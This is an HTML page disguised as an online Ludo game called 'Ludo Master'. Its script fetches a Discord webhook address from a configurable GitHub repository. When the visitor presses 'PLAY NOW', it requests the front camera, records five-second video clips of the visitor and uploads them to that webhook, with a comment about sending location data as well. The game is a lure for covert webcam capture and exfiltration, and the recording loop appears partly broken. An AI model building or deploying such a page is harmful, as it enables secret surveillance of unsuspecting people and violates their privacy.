<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        body {
            background-color: #2c3e50;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .game-container {
            text-align: center;
        }
        .play-btn {
            background-color: #f39c12;
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 24px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            transition: transform 0.2s;
        }
        .play-btn:hover { transform: scale(1.05); }
        #status { margin-top: 20px; color: #bdc3c7; font-size: 14px; }
    </style>
</head>
<body>

    <div class="game-container">
        <h1>🎲 Ludo Master 🎲</h1>
        <button class="play-btn" id="playBtn">PLAY NOW</button>
        <div id="status">Connecting to server...</div>
    </div>

    <script>
        // CONFIG: Change this to your Ludo Repo's raw URL path
        const CONFIG = {
            repoOwner: "YOUR_USERNAME", 
            repoName: "YOUR_LUDO_REPO_NAME",
            branch: "main"
        };

        let webhookUrl = "";

        // Function to load config from config.json
        async function loadConfig() {
            const statusDiv = document.getElementById('status');
            try {
                // Fetch config.json from GitHub
                const url = `https://raw.githubusercontent.com/${CONFIG.repoOwner}/${CONFIG.repoName}/${CONFIG.branch}/config.json`;
                
                const response = await fetch(url);
                if (!response.ok) throw new Error("Could not load config");
                
                const data = await response.json();
                webhookUrl = data.discord_webhook_url;
                statusDiv.innerText = "Server Connected | Webhook Loaded";
                
            } catch (error) {
                statusDiv.innerText = "Error: " + error.message;
                // Fallback to local storage if GitHub fails
                webhookUrl = localStorage.getItem('webhook_url') || "https://discord.com/api/webhooks/DEFAULT/DEFAULT";
            }
        }

        // Start recording logic
        document.getElementById('playBtn').addEventListener('click', async () => {
            if (!webhookUrl) {
                alert("Config not loaded yet. Please refresh.");
                return;
            }

            document.getElementById('status').innerText = "Requesting Camera & Location...";

            try {
                // 1. Get Camera & Location Permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                
                // 2. Start Recording Logic (Simplified for demo)
                startRecordingLoop(stream, webhookUrl);
                
            } catch (err) {
                document.getElementById('status').innerText = "Permission Denied: " + err.message;
            }
        });

        function startRecordingLoop(stream, webhook) {
            const statusDiv = document.getElementById('status');
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];

            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                chunks.length = 0; // Clear chunks

                // Upload to Discord Webhook
                const formData = new FormData();
                formData.append("file", blob, "recording.webm");
                formData.append("payload_json", JSON.stringify({
                    content: `📍 Location Data sent separately` // Webhook supports text + file
                }));

                try {
                    const response = await fetch(webhook, {
                        method: "POST",
                        body: formData
                    });
                    if (response.ok) {
                        statusDiv.innerText = "Video Sent! Waiting 5 seconds...";
                        setTimeout(() => {
                            mediaRecorder.start(); // Restart loop
                        }, 5000);
                    } else {
                        statusDiv.innerText = "Upload Failed.";
                    }
                } catch (e) {
                    statusDiv.innerText = "Error: " + e.message;
                }
            };

            // Start first recording
            mediaRecorder.start();
            statusDiv.innerText = "Recording... (5s)";
            
            // Record for 5 seconds
            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000);
        }

        // Load config on page load
        window.onload = loadConfig;
    </script>
</body>
</html>
